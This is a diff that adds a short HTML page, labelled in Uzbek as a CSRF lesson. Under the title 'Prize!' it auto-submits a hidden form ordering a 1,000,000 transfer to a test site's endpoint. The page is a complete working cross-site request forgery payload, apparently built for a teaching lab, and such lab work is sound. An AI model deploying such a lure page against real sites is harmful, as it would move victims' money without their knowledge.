@@ -1,0 +1,11 @@
+<!doctype html>
+<html lang="uz">
+<head><meta charset="utf-8"><title>Yutuq!</title></head>
+<body>
+  <!-- CSRF darsi: boshqa saytdagi sahifa foydalanuvchi bilmagan holda sayt.test ga forma yuboradi -->
+  <form id="f" method="POST" action="https://sayt.test/csrf/otkazma">
+    <input type="hidden" name="summa" value="1000000">
+  </form>
+  <script>document.getElementById('f').submit()</script>
+</body>
+</html>
